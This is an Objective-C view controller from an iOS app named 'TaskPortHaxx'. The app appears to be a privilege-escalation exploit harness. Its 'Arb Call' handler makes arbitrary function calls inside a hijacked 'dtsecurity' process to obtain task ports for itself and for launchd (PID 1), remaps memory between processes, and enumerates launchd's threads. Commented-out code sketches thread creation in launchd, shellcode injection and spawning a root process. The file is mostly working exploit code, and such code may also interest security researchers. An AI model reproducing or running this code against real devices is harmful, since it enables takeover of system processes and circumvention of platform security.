//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import MachO;
@import XPC;
#import "ViewController.h"
#include "Header.h"
#include <sys/wait.h>


@interface ViewController ()
@property(nonatomic) mach_port_t exceptionPort;
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) pid_t childPid, sleepPid;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.title = @"Task Port Haxx";
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Options" menu:[UIMenu menuWithTitle:@"Options" children:@[
        [UIAction actionWithTitle:@"Change Signed Pointer" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self changePtrTapped];
        }]
    ]]];
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
    ];
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    self.exceptionPort = setup_exception_server();
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    self.childPid = -1;
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)changePtrTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Change Signed Pointer" message:@"Enter new signed pointer and diversifier value (hex):" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Signed Pointer (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%lx", NSUserDefaults.standardUserDefaults.signedPointer];
    }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Diversifier (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%x", NSUserDefaults.standardUserDefaults.signedDiversifier];
    }];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        UITextField *textField = alert.textFields.firstObject;
        NSUInteger signedPointer = strtoull(textField.text.UTF8String, NULL, 16);
        uint32_t diversifier = (uint32_t)strtoul(alert.textFields[1].text.UTF8String, NULL, 16);
        NSUserDefaults.standardUserDefaults.signedPointer = signedPointer;
        NSUserDefaults.standardUserDefaults.signedDiversifier = diversifier;
        printf("Set signed pointer to 0x%lx\n", signedPointer);
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:okAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)testButtonTapped {
    if (getpgid(_childPid) > 0) {
        printf("Child already spawned with PID %d\n", self.childPid);
        return;
    }
    self.childPid = 0; // TODO: get pid
    launchTest(@"dtsecurity");
}

- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        vm_size_t shared_size = getpagesize();
        vm_address_t map = RemoteArbCall(mmap, 0, shared_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        printf("Mapped memory at 0x%lx\n", map);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
        kern_return_t kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get my task port\n");
            return;
        }
        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
        // Map the page we allocated in dtsecurity to this process
        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, shared_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
        if (kr != KERN_SUCCESS) {
            printf("Failed to create dtsecurity<->haxx shared mapping\n");
            return;
        }
        vm_address_t local_map = RemoteRead64(map);
        printf("Created shared mapping: 0x%lx\n", local_map);
        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Test mkdir
        RemoteWriteString(map, "/tmp/.it_works");
        RemoteArbCall(mkdir, map, 0700);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            return;
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base for blr x19
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = *(void**)(local_map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
        vm_address_t remote_dyld_base;
        do {
            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
            // FIXME: why do I have to sleep a bit for dyld base to be available?
            usleep(100000);
        } while (remote_dyld_base == 0);
        printf("launchd dyld base: 0x%lx\n", remote_dyld_base);
        
        // stuff
        uint64_t remote_list = map + sizeof(uint64_t);
        RemoteArbCall(task_threads, launchd_task, remote_list, map);
        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
        RemoteArbCall(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
        for (int i = 0; i < listCnt; i++) {
            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
            // panic your launchd
            //RemoteArbCall(thread_abort, act_list[i]);
        }
        
//        arm_thread_state64_internal ts;
//        RemoteArbCall(memset, map+0x10, 0x41, sizeof(ts));
//        kr = RemoteArbCall(thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
//        printf("thread_create_running returned %d\n", kr);
//        thread_act_t tid = RemoteRead32(map);
//        printf("tid: 0x%x\n", tid);
        
//        printf("Sleeping...\n");
//        RemoteArbCall(sleep, 10);
        
        // Get remote dyld base for blr x19
//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(task_self_trap);
//        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
//        kern_return_t kr = (kern_return_t)RemoteArbCall(task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
//        if (kr != KERN_SUCCESS) {
//            printf("task_info failed\n");
//            return;
//        }
//        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
//        vm_address_t remote_dyld_base;
//        do {
//            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
//            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
//            // FIXME: why do I have to sleep a bit for dyld base to be available?
//            usleep(100000);
//        } while (remote_dyld_base == 0);
//        blrX19Address = remote_dyld_base + blrX19Offset;
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
//        RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
//        mach_port_t remote_bootstrap_port = RemoteRead32(map);
//        RemoteWriteString(map, "_os_alloc_once_table");
//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(dlsym, (uint64_t)RTLD_DEFAULT, map);
//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
//        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
//        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
//        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
//        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(((uint64_t (*)(void))map));
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RemoteDetach();
    });
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

@end

@implementation NSUserDefaults(Pref)
- (void)setSignedPointer:(NSUInteger)signedPointer {
    [self setObject:@(signed_pointer = signedPointer) forKey:@"signedPointer"];
}
- (NSUInteger)signedPointer {
    return signed_pointer = [[self objectForKey:@"signedPointer"] unsignedIntegerValue];
}
- (void)setSignedDiversifier:(uint32_t)signedDiversifier {
    [self setObject:@(signedDiversifier) forKey:@"signedDiversifier"];
}
- (uint32_t)signedDiversifier {
    return [[self objectForKey:@"signedDiversifier"] unsignedIntValue];
}
@end
